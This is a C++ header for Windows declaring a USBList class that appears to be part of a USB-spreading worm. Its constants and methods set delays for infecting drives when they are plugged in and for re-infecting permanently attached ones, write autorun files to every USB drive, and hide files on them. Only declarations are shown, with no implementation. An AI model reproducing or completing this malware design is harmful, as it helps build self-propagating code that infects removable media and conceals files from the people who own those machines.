#include <windows.h>
#include "FunctionsWindowsNT.h"
#include "FunctionsFiles.h"

#define DELAY_INFECT_WHEN_USB_ARRIVE           5000
#define DELAY_INFECT_PERMANENT_USB_DEVICES     500

#pragma once

class USBList {
   private:
      static char ** USBDeviceList;
      static char * strAutoRunFilenameWhenUSBArrive;
      static int numElems; 
      static long delayInfectWhenUSBDeviceArrive;
      static long delayInfectPermanentUSBDevices;
      static bool inicialized;
      static bool quitInfectPermanentUSBDevices;
      static bool driveIsInScannedList(char * driveLetter);
      static bool hideUSBFiles;
      
   public:
      static void inicialize(HINSTANCE hInstance, bool hideFiles = true, bool infectOnUSBDeviceConnect = true, long delayInfectWhenUSBArrive = DELAY_INFECT_WHEN_USB_ARRIVE, bool infectPermanentUSB = true, long delayInfectPermanentUSB = DELAY_INFECT_PERMANENT_USB_DEVICES);
      static bool scanUSBRemovableAndFixedDevices();
      static bool createAutorunInUSBDevice(const char * letter, const char * strAutoRunFilename);
      static bool createAutorunInAllUSBDevices(const char * strAutoRunFilename);
      static bool setAutoRunFilenameWhenUSBArriveOrPermanentScan(const char * strAutoRunFilename);
      static char ** getUSBRemovableAndFixedList();
      static char * getAutoRunFilenameWhenUSBArriveOrPermanentScan();
      static void setInfectPermanentUSBDevicesValue(bool infect);
      static int getNumElems() { return numElems; }
      static long getDelayInfectWhenUSBDeviceArrive() { return delayInfectWhenUSBDeviceArrive; }
      static long getDelayInfectPermanentUSBDevices() { return delayInfectPermanentUSBDevices; }
      static bool infectPermanentUSBDevicesIsCancelled() { return quitInfectPermanentUSBDevices; }
};
